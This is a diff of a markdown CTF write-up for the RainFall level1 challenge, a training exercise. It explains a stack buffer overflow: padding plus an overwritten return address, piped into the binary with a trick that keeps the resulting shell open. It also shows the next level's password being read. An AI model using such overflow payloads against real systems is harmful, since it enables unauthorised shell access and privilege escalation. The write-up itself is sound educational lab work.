@@ -147,4 +147,31 @@ That will fill the buffer part and the bp part! So the next part will be on the 
 
 Now we will use python to do so, careful about the endian to write the address!
 
-`python -c 'print "a"*76 + "\x44\x84\x04\x08"' | ./level1`
+Which should be:
+
+`\x44\x84\x04\x08`
+
+And the final part of our craft will result in:
+
+```bash
+level1@RainFall:~$ python2 -c 'print "a"*76 + "\x44\x84\x04\x08"' | ./level1
+Good... Wait what?
+Segmentation fault (core dumped)
+level1@RainFall:~$
+```
+
+Uh? Weird, it doesn't keep the shell open... Since the `/bin/sh` will read the input passed previously and read EOF which will close the prompt.
+
+More precisions [here](https://unix.stackexchange.com/questions/203012/why-cant-i-open-a-shell-from-a-pipelined-process)
+
+So there is a small trick we can use using `-` which is an alias to `/dev/stdin`. In this case it will be used to concat our payload and stdin so that the shell doesn't close!
+
+```bash
+level1@RainFall:~$ python2 -c 'print "a"*76 + "\x44\x84\x04\x08"' > /tmp/payload.txt
+level1@RainFall:~$ cat /tmp/payload.txt - | ./level1
+Good... Wait what?
+whoami
+level2
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
